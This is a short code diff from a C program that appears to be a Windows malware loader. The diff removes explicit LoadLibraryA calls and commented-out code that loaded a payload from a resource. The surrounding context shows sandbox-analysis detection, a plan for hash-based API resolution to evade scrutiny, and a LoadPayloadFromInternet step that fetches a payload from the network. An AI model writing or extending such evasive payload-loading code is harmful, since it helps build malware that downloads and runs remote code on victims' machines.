@@ -31,11 +31,6 @@ int main() {
 		return -1;
 	}
 
-	// TODO: Init kernel32 WinAPIs first and then use hashed-resolved version of LoadLibraryA for loading user32.dll
-	// Load user32.dll for use
-	HMODULE hUser32Dll = LoadLibraryA("user32.dll");
-	HMODULE hWininetDll = LoadLibraryA("wininet.dll");
-
 	// Init WinApis for use
 	if (InitializeWinApis() == FALSE) {
 		PRINTA("[!] Failed To Initialize Windows APIs\n");
@@ -60,14 +55,6 @@ int main() {
 		PRINTA("File Is Being Analyzed!\n");
 	}
 #endif
-
-	// Resource reading is only for debugging purposes
-	//if (LoadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
-	//	PRINTA("[!] Failed To Load Payload From The Resource\n");
-	//	return -1;
-	//}
-	//PRINTA("[+] Load Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
-	//PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);
 
 	// Internet reading
 	if (LoadPayloadFromInternet(&pPayloadAddress, &sPayloadSize) != TRUE) {
